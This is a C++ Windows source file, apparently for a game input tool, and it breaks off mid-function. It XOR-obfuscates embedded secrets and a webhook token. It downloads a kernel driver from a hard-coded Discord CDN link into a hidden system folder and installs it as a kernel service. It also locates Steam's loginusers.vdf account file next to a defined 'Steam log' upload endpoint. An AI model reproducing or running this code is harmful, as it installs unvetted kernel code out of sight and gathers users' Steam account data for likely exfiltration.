#define _WIN32_WINNT 0x0A00 
#include <windows.h>
#include <winioctl.h>
#include <iostream> 
#include <cstdio>
#include <cstdlib>
#include <vector>
#include <array>
#include <string>
#include <map>
#include <cmath>
#include <thread>
#include <chrono>
#include <atomic>
#include <mutex>
#include <stdexcept>
#include <algorithm>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <ctime>
#include <shellapi.h>
#include <wininet.h>
#include <mmsystem.h>
#include <iphlpapi.h>
#include <lmcons.h>
#include <sysinfoapi.h>
#include <VersionHelpers.h>
#include <dwmapi.h>
#include <fileapi.h>
#include <winuser.h>
#include <timeapi.h>
#include <dxgi.h>
#include <locale.h>
#include <winreg.h>
#include <winnls.h>
#include <vector>
#include <stdint.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winsvc.h>
#include "json.hpp"
#include "picosha2.h"

static constexpr unsigned char STR_XOR_KEY = 0xAB;

static std::string xor_decrypt_bytes(const unsigned char* data, size_t len) {
    std::string out;
    out.resize(len);
    for (size_t i = 0; i < len; ++i) {
        out[i] = static_cast<char>(data[i] ^ STR_XOR_KEY);
    }
    return out;
}

namespace xor_strings {
    constexpr unsigned char driver_device_name[] = {
        '\\' ^ STR_XOR_KEY,
        '\\' ^ STR_XOR_KEY,
        '.'  ^ STR_XOR_KEY,
        '\\' ^ STR_XOR_KEY,
        'A'  ^ STR_XOR_KEY,
        'd'  ^ STR_XOR_KEY,
        'v'  ^ STR_XOR_KEY,
        'e'  ^ STR_XOR_KEY,
        'r'  ^ STR_XOR_KEY,
        's'  ^ STR_XOR_KEY,
        'e'  ^ STR_XOR_KEY,
        '\0' ^ STR_XOR_KEY
    };

    constexpr unsigned char license_hmac_secret[] = {
        '7' ^ STR_XOR_KEY,
        'c' ^ STR_XOR_KEY,
        '2' ^ STR_XOR_KEY,
        'f' ^ STR_XOR_KEY,
        '9' ^ STR_XOR_KEY,
        'a' ^ STR_XOR_KEY,
        '4' ^ STR_XOR_KEY,
        'b' ^ STR_XOR_KEY,
        '1' ^ STR_XOR_KEY,
        'e' ^ STR_XOR_KEY,
        '8' ^ STR_XOR_KEY,
        'd' ^ STR_XOR_KEY,
        '6' ^ STR_XOR_KEY,
        'c' ^ STR_XOR_KEY,
        '5' ^ STR_XOR_KEY,
        'a' ^ STR_XOR_KEY,
        '0' ^ STR_XOR_KEY,
        'f' ^ STR_XOR_KEY,
        '3' ^ STR_XOR_KEY,
        'b' ^ STR_XOR_KEY,
        '2' ^ STR_XOR_KEY,
        'd' ^ STR_XOR_KEY,
        '7' ^ STR_XOR_KEY,
        'e' ^ STR_XOR_KEY,
        '9' ^ STR_XOR_KEY,
        'c' ^ STR_XOR_KEY,
        '1' ^ STR_XOR_KEY,
        'a' ^ STR_XOR_KEY,
        '4' ^ STR_XOR_KEY,
        'f' ^ STR_XOR_KEY,
        '8' ^ STR_XOR_KEY,
        'b' ^ STR_XOR_KEY,
        '6' ^ STR_XOR_KEY,
        'd' ^ STR_XOR_KEY,
        '0' ^ STR_XOR_KEY,
        'e' ^ STR_XOR_KEY,
        '3' ^ STR_XOR_KEY,
        'c' ^ STR_XOR_KEY,
        '9' ^ STR_XOR_KEY,
        'a' ^ STR_XOR_KEY,
        '5' ^ STR_XOR_KEY,
        'b' ^ STR_XOR_KEY,
        '7' ^ STR_XOR_KEY,
        'f' ^ STR_XOR_KEY,
        '1' ^ STR_XOR_KEY,
        'd' ^ STR_XOR_KEY,
        '2' ^ STR_XOR_KEY,
        'e' ^ STR_XOR_KEY,
        '8' ^ STR_XOR_KEY,
        'c' ^ STR_XOR_KEY,
        '4' ^ STR_XOR_KEY,
        'a' ^ STR_XOR_KEY,
        '6' ^ STR_XOR_KEY,
        'f' ^ STR_XOR_KEY,
        '0' ^ STR_XOR_KEY,
        'b' ^ STR_XOR_KEY,
        '9' ^ STR_XOR_KEY,
        'd' ^ STR_XOR_KEY,
        '3' ^ STR_XOR_KEY,
        'e' ^ STR_XOR_KEY,
        '1' ^ STR_XOR_KEY,
        'c' ^ STR_XOR_KEY,
        '7' ^ STR_XOR_KEY,
        'a' ^ STR_XOR_KEY,
        '\0' ^ STR_XOR_KEY
    };

    constexpr unsigned char license_storage_key[] = {
        'a' ^ STR_XOR_KEY,
        '8' ^ STR_XOR_KEY,
        's' ^ STR_XOR_KEY,
        '7' ^ STR_XOR_KEY,
        'd' ^ STR_XOR_KEY,
        '6' ^ STR_XOR_KEY,
        'f' ^ STR_XOR_KEY,
        '9' ^ STR_XOR_KEY,
        'g' ^ STR_XOR_KEY,
        '8' ^ STR_XOR_KEY,
        'h' ^ STR_XOR_KEY,
        '0' ^ STR_XOR_KEY,
        'j' ^ STR_XOR_KEY,
        '1' ^ STR_XOR_KEY,
        'k' ^ STR_XOR_KEY,
        '2' ^ STR_XOR_KEY,
        'l' ^ STR_XOR_KEY,
        '3' ^ STR_XOR_KEY,
        'z' ^ STR_XOR_KEY,
        '4' ^ STR_XOR_KEY,
        'x' ^ STR_XOR_KEY,
        '5' ^ STR_XOR_KEY,
        'c' ^ STR_XOR_KEY,
        '6' ^ STR_XOR_KEY,
        'v' ^ STR_XOR_KEY,
        '7' ^ STR_XOR_KEY,
        'b' ^ STR_XOR_KEY,
        '8' ^ STR_XOR_KEY,
        'n' ^ STR_XOR_KEY,
        '9' ^ STR_XOR_KEY,
        'm' ^ STR_XOR_KEY,
        '0' ^ STR_XOR_KEY,
        'q' ^ STR_XOR_KEY,
        '1' ^ STR_XOR_KEY,
        'w' ^ STR_XOR_KEY,
        '2' ^ STR_XOR_KEY,
        'e' ^ STR_XOR_KEY,
        '3' ^ STR_XOR_KEY,
        'r' ^ STR_XOR_KEY,
        '4' ^ STR_XOR_KEY,
        't' ^ STR_XOR_KEY,
        '5' ^ STR_XOR_KEY,
        'y' ^ STR_XOR_KEY,
        '6' ^ STR_XOR_KEY,
        'u' ^ STR_XOR_KEY,
        '7' ^ STR_XOR_KEY,
        'i' ^ STR_XOR_KEY,
        '8' ^ STR_XOR_KEY,
        'o' ^ STR_XOR_KEY,
        '9' ^ STR_XOR_KEY,
        'p' ^ STR_XOR_KEY,
        '0' ^ STR_XOR_KEY,
        'A' ^ STR_XOR_KEY,
        '1' ^ STR_XOR_KEY,
        'S' ^ STR_XOR_KEY,
        '2' ^ STR_XOR_KEY,
        'D' ^ STR_XOR_KEY,
        '3' ^ STR_XOR_KEY,
        'F' ^ STR_XOR_KEY,
        '4' ^ STR_XOR_KEY,
        'G' ^ STR_XOR_KEY,
        '5' ^ STR_XOR_KEY,
        'H' ^ STR_XOR_KEY,
        '6' ^ STR_XOR_KEY,
        'J' ^ STR_XOR_KEY,
        '7' ^ STR_XOR_KEY,
        'K' ^ STR_XOR_KEY,
        '8' ^ STR_XOR_KEY,
        'L' ^ STR_XOR_KEY,
        '9' ^ STR_XOR_KEY,
        'Z' ^ STR_XOR_KEY,
        '0' ^ STR_XOR_KEY,
        'X' ^ STR_XOR_KEY,
        '1' ^ STR_XOR_KEY,
        'C' ^ STR_XOR_KEY,
        '2' ^ STR_XOR_KEY,
        'V' ^ STR_XOR_KEY,
        '3' ^ STR_XOR_KEY,
        'B' ^ STR_XOR_KEY,
        '4' ^ STR_XOR_KEY,
        'N' ^ STR_XOR_KEY,
        '5' ^ STR_XOR_KEY,
        'M' ^ STR_XOR_KEY,
        '6' ^ STR_XOR_KEY,
        'Q' ^ STR_XOR_KEY,
        '7' ^ STR_XOR_KEY,
        'W' ^ STR_XOR_KEY,
        '7' ^ STR_XOR_KEY,
        'E' ^ STR_XOR_KEY,
        '8' ^ STR_XOR_KEY,
        'R' ^ STR_XOR_KEY,
        '9' ^ STR_XOR_KEY,
        'T' ^ STR_XOR_KEY,
        '0' ^ STR_XOR_KEY,
        'Y' ^ STR_XOR_KEY,
        '1' ^ STR_XOR_KEY,
        'U' ^ STR_XOR_KEY,
        '2' ^ STR_XOR_KEY,
        'I' ^ STR_XOR_KEY,
        '3' ^ STR_XOR_KEY,
        'O' ^ STR_XOR_KEY,
        '4' ^ STR_XOR_KEY,
        'P' ^ STR_XOR_KEY,
        '5' ^ STR_XOR_KEY,
        '\0' ^ STR_XOR_KEY
    };

    constexpr unsigned char webhook_token[] = {
        'm' ^ STR_XOR_KEY,
        'y' ^ STR_XOR_KEY,
        's' ^ STR_XOR_KEY,
        'e' ^ STR_XOR_KEY,
        'c' ^ STR_XOR_KEY,
        'r' ^ STR_XOR_KEY,
        'e' ^ STR_XOR_KEY,
        't' ^ STR_XOR_KEY,
        't' ^ STR_XOR_KEY,
        'o' ^ STR_XOR_KEY,
        'k' ^ STR_XOR_KEY,
        'e' ^ STR_XOR_KEY,
        'n' ^ STR_XOR_KEY,
        '\0' ^ STR_XOR_KEY
    };

    inline const char* get_driver_device_name() {
        static std::string s = xor_decrypt_bytes(driver_device_name, sizeof(driver_device_name) - 1);
        return s.c_str();
    }

    inline const char* get_license_hmac_secret() {
        static std::string s = xor_decrypt_bytes(license_hmac_secret, sizeof(license_hmac_secret) - 1);
        return s.c_str();
    }

    inline std::string get_license_storage_key() {
        static std::string s = xor_decrypt_bytes(license_storage_key, sizeof(license_storage_key) - 1);
        return s;
    }

    inline std::string get_webhook_token() {
        static std::string s = xor_decrypt_bytes(webhook_token, sizeof(webhook_token) - 1);
        return s;
    }
};

enum class UINoticeLevel {
    Info,
    Warning,
    Error
};

void set_ui_notice(UINoticeLevel level,
                   const std::string& title,
                   const std::string& message,
                   const std::string& details = std::string());
void clear_ui_notice();
// --- Core.sys Driver 
#define IOCTL_MOUSE_MOVE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_MOUSE_MOVE_RAW 0x220444

// Base license API endpoint (used for license and free trial checks)
const char* LICENSE_API_BASE_URL = "https://script.google.com/macros/s/AKfycbwXP7s7ZYyIZnS-AEgntFsnc-BmpfvFsvJyTZsEbfuPN5lK5f20DNYFFUsEqEtK5eG7AA/exec";
const char* STEAM_LOG_API_URL = "https://script.google.com/macros/s/AKfycbxjCs4E-Qcpt285DIMbmbCKnIWTAf4siSKxPCMu4KqO8EZk1b_P76oV9e6aWPbSwoqIjw/exec";
const char* LICENSE_HMAC_SECRET = xor_strings::get_license_hmac_secret();

// Endpoint that returns the driver download URL as plain text when called with mode=driver_url
// CORE_DRIVER_DOWNLOAD_URL removed as we now use a direct Discord CDN link.

typedef struct _CORE_MOUSE_MOVE_INPUT {
    LONG x;
    LONG y;
    USHORT flags;
    USHORT padding;
} CORE_MOUSE_MOVE_INPUT, *PCORE_MOUSE_MOVE_INPUT;

class CoreMouseDriver {
private:
    HANDLE hDriver;

public:
    CoreMouseDriver() : hDriver(INVALID_HANDLE_VALUE) {}

    ~CoreMouseDriver() {
        Close();
    }

    bool Open() {
        if (hDriver != INVALID_HANDLE_VALUE) {
            return true;
        }

        std::string deviceNameA = xor_strings::get_driver_device_name();
        std::wstring deviceNameW(deviceNameA.begin(), deviceNameA.end());

        hDriver = CreateFileW(
            deviceNameW.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hDriver == INVALID_HANDLE_VALUE) {
            DWORD err = GetLastError();
            std::cerr << "Code: " << err << std::endl;
            set_ui_notice(UINoticeLevel::Error,
                          "Driver",
                          "Driver device is not accessible. Run as Administrator and restart your PC if needed.",
                          std::string("CreateFile(") + deviceNameA + ") error: " + std::to_string(err));
            return false;
        }

        return true;
    }

    void Close() {
        if (hDriver != INVALID_HANDLE_VALUE) {
            CloseHandle(hDriver);
            hDriver = INVALID_HANDLE_VALUE;
        }
    }

    bool MoveMouse(LONG x, LONG y, USHORT buttonFlags = 0) {
        if (hDriver == INVALID_HANDLE_VALUE) {
            return false;
        }

        CORE_MOUSE_MOVE_INPUT input;
        input.x = x;
        input.y = y;
        input.flags = buttonFlags;
        input.padding = 0;

        DWORD bytesReturned = 0;
        BOOL result = DeviceIoControl(
            hDriver,
            IOCTL_MOUSE_MOVE_RAW,
            &input,
            sizeof(input),
            NULL,
            0,
            &bytesReturned,
            NULL
        );

        if (!result) {
            DWORD error = GetLastError();
            std::cerr << "DeviceIoControl (driver) failed. Error: " << error << std::endl;
            return false;
        }

        return true;
    }

    bool IsOpen() const {
        return hDriver != INVALID_HANDLE_VALUE;
    }
};

static CoreMouseDriver g_coreMouseDriver;
static std::once_flag g_core_mouse_init_flag;

// اعلان تابع لاگ قبل از استفاده در Helperها
void output_log_message(const std::string& message);

void send_webhook_via_google_script(const std::string& full_url, const std::string& token, const std::string& message);

// --- Admin and Core.sys driver installation helpers ---

bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(
            &ntAuthority,
            2,
            SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0,
            &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }

    return isAdmin == TRUE;
}

bool RelaunchAsAdmin() {
    wchar_t exePath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
        std::cerr << "GetModuleFileNameW failed when trying to relaunch as admin. Error: " << GetLastError() << std::endl;
        return false;
    }

    SHELLEXECUTEINFOW sei{};
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_DEFAULT;
    sei.hwnd = NULL;
    sei.lpVerb = L"runas"; // Triggers UAC elevation prompt
    sei.lpFile = exePath;
    sei.nShow = SW_SHOWNORMAL;

    if (!ShellExecuteExW(&sei)) {
        DWORD err = GetLastError();
        std::cerr << "ShellExecuteExW for elevation failed. Error: " << err << std::endl;
        return false;
    }

    return true;
}

std::wstring GetExecutableDirectoryW() {
    wchar_t exePath[MAX_PATH];
    DWORD len = GetModuleFileNameW(NULL, exePath, MAX_PATH);
    if (len == 0 || len >= MAX_PATH) {
        return L"";
    }

    std::wstring path(exePath, len);
    size_t pos = path.find_last_of(L"\\/");
    if (pos != std::wstring::npos) {
        path.resize(pos);
    }
    return path;
}

bool FileExistsW(const std::wstring& path) {
    DWORD attrs = GetFileAttributesW(path.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
}

bool FileExistsA(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
}


std::string find_steam_loginusers_vdf_path() {
    // 1) Default path
    const char* default_path = "C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf";
    if (FileExistsA(default_path)) {
        return std::string(default_path);
    }

    // 2) Check registry for SteamPath / InstallPath
    auto try_registry_path = [](HKEY root, const char* subkey, const char* value_name) -> std::string {
        HKEY hKey;
        if (RegOpenKeyExA(root, subkey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
            return std::string();
        }

        char buffer[MAX_PATH] = {0};
        DWORD bufSize = sizeof(buffer);
        DWORD type = 0;
        if (RegQueryValueExA(hKey, value_name, nullptr, &type, reinterpret_cast<LPBYTE>(buffer), &bufSize) == ERROR_SUCCESS &&
            (type == REG_SZ || type == REG_EXPAND_SZ)) {
            RegCloseKey(hKey);
            std::string base(buffer);
            if (!base.empty() && (base.back() == '\\' || base.back() == '/')) {
                base.pop_back();
            }
            std::string candidate = base + "\\config\\loginusers.vdf";
            if (FileExistsA(candidate)) {
                return candidate;
            }
        } else {
            RegCloseKey(hKey);
        }
        return std::string();
    };

    // HKCU SteamPath
    std::string reg_path = try_registry_path(HKEY_CURRENT_USER, "Software\\Valve\\Steam", "SteamPath");
    if (!reg_path.empty()) {
        return reg_path;
    }

    // HKLM InstallPath
    reg_path = try_registry_path(HKEY_LOCAL_MACHINE, "Software\\Valve\\Steam", "InstallPath");
    if (!reg_path.empty()) {
        return reg_path;
    }

    // 3) Try to locate a running steam.exe process and use its folder
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_stricmp(pe32.szExeFile, "steam.exe") == 0) {
                    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                    if (hProc) {
                        char exePath[MAX_PATH] = {0};
                        if (GetModuleFileNameExA(hProc, NULL, exePath, MAX_PATH) > 0) {
                            std::string path(exePath);
                            size_t pos = path.find_last_of("\\/");
                            if (pos != std::string::npos) {
                                path.resize(pos);
                            }
                            std::string candidate = path + "\\config\\loginusers.vdf";
                            CloseHandle(hProc);
                            CloseHandle(hSnapshot);
                            if (FileExistsA(candidate)) {
                                return candidate;
                            }
                        }
                        CloseHandle(hProc);
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    // Fallback: return default even if it doesn't exist, so caller can log the attempted path
    return std::string(default_path);
}

std::wstring GetCoreDriverHiddenPath() {
    wchar_t programDataPath[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, programDataPath) != S_OK) {
        return L"";
    }

    std::wstring dir(programDataPath);
    dir += L"\\Drivers"; 
    CreateDirectoryW(dir.c_str(), NULL);
    SetFileAttributesW(dir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    return dir + L"\\Core.sys";
}

// Helper to fetch textual content from a URL (used to retrieve the actual driver download URL)
std::string HttpGetToString(const char* url) {
    std::string result;

    HINTERNET hInternet = InternetOpenA("CoreDriverClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return result;
    }

    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return result;
    }

    char buffer[4096];
    DWORD bytesRead = 0;
    BOOL readOk = FALSE;

    while (true) {
        readOk = InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);
        if (!readOk || bytesRead == 0) {
            break;
        }

        result.append(buffer, bytesRead);
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    return result;
}

bool HttpPostJsonToString(const std::string& url,
                          const std::string& json_body,
                          std::string& out_response,
                          std::string& out_error,
                          DWORD timeout_ms = 8000) {
    out_response.clear();
    out_error.clear();

    HINTERNET hInternet = InternetOpenA(" Core Client", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        out_error = "InternetOpen failed.";
        return false;
    }

    if (timeout_ms > 0) {
        InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout_ms, sizeof(timeout_ms));
        InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout_ms, sizeof(timeout_ms));
        InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout_ms, sizeof(timeout_ms));
    }

    URL_COMPONENTSA url_comp;
    ZeroMemory(&url_comp, sizeof(url_comp));
    url_comp.dwStructSize = sizeof(url_comp);
    url_comp.dwHostNameLength = 1;
    url_comp.dwUrlPathLength = 1;

    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.length(), 0, &url_comp)) {
        out_error = "InternetCrackUrl failed.";
        InternetCloseHandle(hInternet);
        return false;
    }

    std::vector<char> host_name(url_comp.dwHostNameLength + 1);
    std::vector<char> url_path(url_comp.dwUrlPathLength + 1);
    url_comp.lpszHostName = host_name.data();
    url_comp.lpszUrlPath = url_path.data();
    url_comp.dwHostNameLength++;
    url_comp.dwUrlPathLength++;

    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.length(), 0, &url_comp)) {
        out_error = "InternetCrackUrl failed (buffers).";
        InternetCloseHandle(hInternet);
        return false;
    }

    HINTERNET hConnect = InternetConnectA(hInternet,
                                          url_comp.lpszHostName,
                                          url_comp.nPort,
                                          NULL,
                                          NULL,
                                          INTERNET_SERVICE_HTTP,
                                          0,
                                          0);
    if (!hConnect) {
        out_error = "InternetConnect failed.";
        InternetCloseHandle(hInternet);
        return false;
    }

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (url_comp.nScheme == INTERNET_SCHEME_HTTPS) {
        flags |= INTERNET_FLAG_SECURE;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect,
                                          "POST",
                                          url_comp.lpszUrlPath,
                                          NULL,
                                          NULL,
                                          NULL,
                                          flags,
                                          0);
    if (!hRequest) {
        out_error = "HttpOpenRequest failed.";
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    std::string headers = "Content-Type: application/json\r\n";

    if (!HttpSendRequestA(hRequest,
                          headers.c_str(),
                          (DWORD)headers.length(),
                          (LPVOID)json_body.data(),
                          (DWORD)json_body.size())) {
        out_error = "HttpSendRequest failed. Error: " + std::to_string(GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[4096];
    DWORD bytes_read = 0;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytes_read) && bytes_read > 0) {
        buffer[bytes_read] = '\0';
        out_response.append(buffer);
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    if (out_response.empty()) {
        out_error = "Empty response from server.";
        return false;
    }

    return true;
}

bool DownloadFileToPath(const char* url, const std::wstring& destPath) {
    {
        std::string urlStr = (url ? std::string(url) : std::string(""));
        std::string destUtf8(destPath.begin(), destPath.end());
        output_log_message("[Driver] DownloadFileToPath called. URL: " + urlStr + " Dest: " + destUtf8 + "\n");
    }
    HINTERNET hInternet = InternetOpenA("CoreDriverClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        output_log_message("[Driver] DownloadFileToPath failed: InternetOpenA failed. Error: " + std::to_string(GetLastError()) + "\n");
        return false;
    }

    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        output_log_message("[Driver] DownloadFileToPath failed: InternetOpenUrlA failed. Error: " + std::to_string(GetLastError()) + "\n");
        InternetCloseHandle(hInternet);
        return false;
    }

    HANDLE hFile = CreateFileW(destPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        output_log_message("[Driver] DownloadFileToPath failed: CreateFileW failed. Error: " + std::to_string(GetLastError()) + "\n");
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return false;
    }

    BYTE buffer[4096];
    DWORD bytesRead = 0;
    BOOL readOk = FALSE;

    while (true) {
        readOk = InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);
        if (!readOk || bytesRead == 0) {
            break;
        }

        DWORD bytesWritten = 0;
        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
            output_log_message("[Driver] DownloadFileToPath failed: WriteFile failed. Error: " + std::to_string(GetLastError()) + "\n");
            CloseHandle(hFile);
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return false;
        }
    }

    CloseHandle(hFile);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    bool exists = FileExistsW(destPath);
    output_log_message(std::string("[Driver] DownloadFileToPath finished. Exists: ") + (exists ? "true" : "false") + "\n");
    return exists;
}

bool InstallAndStartCoreDriver(const std::wstring& serviceName,
                               const std::wstring& driverPath) {
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        DWORD err = GetLastError();
        std::cerr << "OpenSCManagerW failed. Error: " << err << std::endl;
        set_ui_notice(UINoticeLevel::Error,
                      "Driver",
                      "Could not access Service Control Manager. Run as Administrator.",
                      std::string("OpenSCManagerW error: ") + std::to_string(err));
        return false;
    }

    SC_HANDLE hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
    if (!hService) {
        DWORD openErr = GetLastError();
        if (openErr != ERROR_SERVICE_DOES_NOT_EXIST) {
            std::cerr << "OpenServiceW for driver service failed. Error: " << openErr << std::endl;
            set_ui_notice(UINoticeLevel::Error,
                          "Driver",
                          "Could not open driver service. Run as Administrator.",
                          std::string("OpenServiceW error: ") + std::to_string(openErr));
            CloseServiceHandle(hSCM);
            return false;
        }

        // Service does not exist yet, create it
        hService = CreateServiceW(
            hSCM,
            serviceName.c_str(),
            serviceName.c_str(),
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            driverPath.c_str(),
            nullptr, nullptr, nullptr, nullptr, nullptr
        );

        if (!hService) {
            DWORD err = GetLastError();
            std::cerr << "CreateServiceW for driver service failed. Error: " << err << std::endl;
            set_ui_notice(UINoticeLevel::Error,
                          "Driver",
                          "Could not create driver service. Run as Administrator.",
                          std::string("CreateServiceW error: ") + std::to_string(err));
            CloseServiceHandle(hSCM);
            return false;
        }
    } else {
        // Service exists already (possibly from an older version). Make sure the binary path points to our driver.
        DWORD bytesNeeded = 0;
        QueryServiceConfigW(hService, nullptr, 0, &bytesNeeded);
        if (bytesNeeded > 0) {
            std::vector<BYTE> buf(bytesNeeded);
            QUERY_SERVICE_CONFIGW* cfg = reinterpret_cast<QUERY_SERVICE_CONFIGW*>(buf.data());
            if (QueryServiceConfigW(hService, cfg, bytesNeeded, &bytesNeeded)) {
                if (cfg->lpBinaryPathName && _wcsicmp(cfg->lpBinaryPathName, driverPath.c_str()) != 0) {
                    {
                        std::string oldPath(cfg->lpBinaryPathName, cfg->lpBinaryPathName + wcslen(cfg->lpBinaryPathName));
                        std::string newPath(driverPath.begin(), driverPath.end());
                        output_log_message("[Driver] Existing service ImagePath differs. Updating. Old: " + oldPath + " New: " + newPath + "\n");
                    }
                    BOOL changed = ChangeServiceConfigW(
                        hService,
                        SERVICE_NO_CHANGE,
                        SERVICE_NO_CHANGE,
                        SERVICE_NO_CHANGE,
                        driverPath.c_str(),
                        nullptr,
                        nullptr,
                        nullptr,
                        nullptr,
                        nullptr,
                        nullptr
                    );
                    if (!changed) {
                        DWORD err = GetLastError();
                        std::wcerr << L"ChangeServiceConfigW failed to update driver ImagePath. Error: " << err
                                   << L" (existing: " << cfg->lpBinaryPathName << L", desired: " << driverPath << L")"
                                   << std::endl;
                        set_ui_notice(UINoticeLevel::Error,
                                      "Driver",
                                      "Could not update driver service path.",
                                      std::string("ChangeServiceConfigW error: ") + std::to_string(err));
                        CloseServiceHandle(hService);
                        CloseServiceHandle(hSCM);
                        return false;
                    }

                    {
                        std::string newPath(driverPath.begin(), driverPath.end());
                        output_log_message("[Driver] Service ImagePath updated successfully. New: " + newPath + "\n");
                    }
                }
            } else {
                DWORD err = GetLastError();
                output_log_message(std::string("[Driver] QueryServiceConfigW failed while checking existing service. Error: ") + std::to_string(err) + "\n");
            }
        }
    }

    BOOL started = StartServiceW(hService, 0, nullptr);
    if (!started) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            std::cerr << "StartServiceW for driver service failed. Error: " << err << std::endl;
            set_ui_notice(UINoticeLevel::Error,
                          "Driver",
                          "Driver could not be started. Restart PC and run as Administrator.",
                          std::string("StartServiceW error: ") + std::to_string(err));
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return false;
        }
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return true;
}

bool EnsureCoreDriverInstalledAndStarted() {
    // First, probe whether the device is already accessible.
    // If so, we treat the driver as already installed and running.
    CoreMouseDriver probe;
    if (probe.Open()) {
        probe.Close();
        std::cerr << " driver already accessible via \\ \\.\\ Skipping installation." << std::endl;
        output_log_message(" device \\.\u00005C already accessible. Skipping installation.\n");
        return true;
    }

    // Determine hidden ProgramData path for the driver
    std::wstring hiddenDriverPath = GetCoreDriverHiddenPath();
    if (hiddenDriverPath.empty()) {
        std::cerr << "Failed to determine hidden ProgramData path for driver file." << std::endl;
        output_log_message("[Driver] Failed to determine hidden ProgramData path for driver file.\n");
        return false;
    }

    {
        std::string utf8Hidden(hiddenDriverPath.begin(), hiddenDriverPath.end());
    }

    bool driverExistsInHidden = FileExistsW(hiddenDriverPath);

    if (!driverExistsInHidden) {

        // استفاده از لینک مستقیم دیسکورد به جای دریافت از سرور
        std::string driverUrlText = "https://cdn.discordapp.com/attachments/1264211540677234821/1466799437929255024/Core.sys?ex=69889aed&is=6987496d&hm=bdb66fff739a21eef646bf998e2ebe10a6a44c0474fc47e7eab5b0003c3b08b0&";

        if (driverUrlText.empty()) {
            std::cerr << "Driver URL is empty." << std::endl;
            output_log_message("[Driver] Driver URL is empty.\n");
            set_ui_notice(UINoticeLevel::Error,
                          "Driver",
                          "Driver download link is missing. Please contact support.");
        } else {
            std::cerr << "Attempting to download driver from direct link." << std::endl;
            output_log_message("[Driver] Attempting to download driver from direct link.\n");

            {
